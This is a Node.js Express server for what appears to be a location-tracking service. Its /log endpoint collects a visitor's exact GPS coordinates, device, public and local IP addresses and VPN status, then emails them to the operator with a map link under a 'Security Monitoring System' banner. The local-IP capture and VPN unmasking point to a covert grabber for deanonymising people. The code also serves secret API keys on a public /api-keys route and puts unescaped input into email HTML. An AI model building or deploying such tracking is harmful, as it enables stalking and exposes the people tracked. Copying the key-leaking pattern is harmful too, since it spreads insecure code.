require('dotenv').config();
const express = require('express');
const cors = require('cors');
const path = require('path');
const { Resend } = require('resend');

const app = express();

app.use(cors());
app.use(express.json());
app.use(express.static(path.join(__dirname)));

app.get('/api-keys', (req, res) => {
  res.json({
    IPGEOLOCATION_API_KEY: process.env.IPGEOLOCATION_API_KEY,
    VPNAPI_KEY: process.env.VPNAPI_KEY,
    IPQUALITY_KEY: process.env.IPQUALITY_KEY
  });
});

app.get("/", (req, res) => {
  res.sendFile(path.join(__dirname, "index.html"));
});

app.post("/log", async (req, res) => {
  console.log('=== FULL PAYLOAD RECEIVED ===');
  console.log(JSON.stringify(req.body, null, 2));
  console.log('=============================');

  const { lat, lng, timestamp, accuracy, device, publicIPv4, publicIPv6, localIPv4, localIPv6, isVPN, vpnProvider, vpnLocation } = req.body;

  if (typeof lat !== "number" || typeof lng !== "number") {
    return res.status(400).json({ error: "Invalid lat/lng" });
  }

  const mapLink = `https://www.google.com/maps?q=${lat.toFixed(6)},${lng.toFixed(6)}`;
  const formattedTime = new Date(timestamp || Date.now()).toLocaleString();

  console.log(`[${new Date().toISOString()}] Location: ${lat.toFixed(6)}, ${lng.toFixed(6)} | VPN: ${isVPN}`);

  const EMAIL_TO = process.env.EMAIL_TO;
  if (!EMAIL_TO) {
    console.warn("⚠️ EMAIL_TO not set in env vars");
    return res.status(200).json({ message: "Location received (no email)", link: mapLink });
  }

  const resend = new Resend(process.env.RESEND_API_KEY);
  if (!process.env.RESEND_API_KEY) {
    console.warn("⚠️ RESEND_API_KEY missing");
    return res.status(200).json({ message: "Location received (no email - missing key)", link: mapLink });
  }

  try {
    const htmlTemplate = `
    <!DOCTYPE html>
    <html lang="en">
    <head>
      <meta charset="UTF-8">
      <meta name="viewport" content="width=device-width, initial-scale=1.0">
      <title>Location Alert</title>
      <style>
        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; line-height: 1.6; color: #333; background-color: #f9f9f9; margin: 0; padding: 0; }
        .email-container { max-width: 650px; margin: 0 auto; background-color: #ffffff; }
        .email-header { background: linear-gradient(135deg, #1a2a6c, #b21f1f); color: white; padding: 30px; text-align: center; }
        .email-body { padding: 30px; }
        .alert-badge { background-color: #fff2f0; color: #d63626; padding: 12px 20px; border-radius: 6px; font-weight: 600; margin-bottom: 25px; border-left: 4px solid #d63626; display: flex; align-items: center; }
        .vpn-alert { background-color: #fff3cd; color: #856404; padding: 12px 20px; border-radius: 6px; margin: 20px 0; border-left: 4px solid #ffc107; }
        .data-table { width: 100%; border-collapse: collapse; margin: 20px 0; background-color: #f8f9fa; border-radius: 8px; overflow: hidden; box-shadow: 0 1px 3px rgba(0,0,0,0.05); }
        .data-table th { background-color: #e9ecef; text-align: left; padding: 15px; font-weight: 600; color: #495057; border-bottom: 2px solid #dee2e6; }
        .data-table td { padding: 15px; border-bottom: 1px solid #dee2e6; }
        .map-link { display: inline-block; background: linear-gradient(135deg, #1a2a6c, #b21f1f); color: white; text-decoration: none; padding: 14px 28px; border-radius: 6px; font-weight: 600; margin: 20px 0; transition: all 0.3s ease; }
        .map-link:hover { background: linear-gradient(135deg, #152359, #8e1919); box-shadow: 0 4px 12px rgba(26, 42, 108, 0.2); }
        .footer { text-align: center; padding: 25px; color: #6c757d; font-size: 13px; border-top: 1px solid #eaeaea; background-color: #f8f9fa; }
      </style>
    </head>
    <body>
      <div class="email-container">
        <div class="email-header">
          <h1>📍 Location Alert Notification</h1>
          <p>New position data received - Security Monitoring System</p>
        </div>
        <div class="email-body">
          <div class="alert-badge">
            <svg width="18" height="18" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
              <path d="M12 9V14M12 17V17.01M3 12C3 4.5885 4.5885 3 12 3C19.4115 3 21 4.5885 21 12C21 19.4115 19.4115 21 12 21C4.5885 21 3 19.4115 3 12Z" stroke="#d63626" stroke-width="2" stroke-linecap="round"/>
            </svg>
            Alert: New Location Data Received
          </div>
          <p>Hello Security Team,</p>
          <p>A new location has been submitted. Please review the details below:</p>
          ${isVPN ? `<div class="vpn-alert"><strong>🚨 VPN DETECTED:</strong> User is connected through a VPN service.</div>` : ''}
          <table class="data-table">
            <tr><th>Parameter</th><th>Value</th></tr>
            <tr><td>Device Type</td><td>${device || 'Unknown Device'}</td></tr>
            <tr><td>Coordinates</td><td>Lat: ${lat.toFixed(6)}, Lng: ${lng.toFixed(6)}</td></tr>
            <tr><td>Accuracy</td><td>${accuracy ? Math.round(accuracy) + ' meters' : 'Not available'}</td></tr>
            <tr><td>Public IPv4</td><td>${publicIPv4 || 'Not available'}</td></tr>
            <tr><td>Public IPv6</td><td>${publicIPv6 || 'Not available'}</td></tr>
            <tr><td>Local IPv4</td><td>${localIPv4 || 'Not available'}</td></tr>
            <tr><td>Local IPv6</td><td>${localIPv6 || 'Not available'}</td></tr>
            <tr><td>VPN Detected</td><td>${isVPN ? 'Yes' : 'No'}</td></tr>
            ${isVPN ? `<tr><td>VPN Provider</td><td>${vpnProvider || 'Unknown'}</td></tr><tr><td>VPN Server Location</td><td>${vpnLocation || 'Unknown'}</td></tr>` : ''}
          </table>
          <div style="text-align: center;">
            <a href="${mapLink}" class="map-link">View Exact Location on Google Maps</a>
          </div>
          <p style="text-align:center; color:#6c757d; margin-top:20px;">Timestamp: ${formattedTime}</p>
          <p>This alert was automatically generated by the Location Tracking System.</p>
          <p>Best regards,<br><strong>Security Monitoring System</strong></p>
        </div>
        <div class="footer">
          <p>This is an automated message. Please do not reply.</p>
          <p>© 2026 Security Monitoring System</p>
        </div>
      </div>
    </body>
    </html>`;

    const { data, error } = await resend.emails.send({
      from: 'Location Tracker <onboarding@resend.dev>',
      to: [EMAIL_TO],
      subject: `📍 Location Alert: ${isVPN ? 'VPN Detected - ' : ''}New Position Data`,
      html: htmlTemplate
    });

    if (error) throw error;

    console.log("✅ Email sent via Resend:", data.id);
    return res.status(200).json({ message: "Location received and email sent", link: mapLink });
  } catch (error) {
    console.error("❌ EMAIL SEND FAILED:", error.message);
    return res.status(200).json({ message: "Location received (email failed)", link: mapLink });
  }
});

const port = process.env.PORT || 4000;
app.listen(port, () => {
  console.log(`🚀 Server running on port ${port}`);
  console.log(`🌐 Live: https://${process.env.RENDER_EXTERNAL_HOSTNAME || 'your-app.onrender.com'}`);
});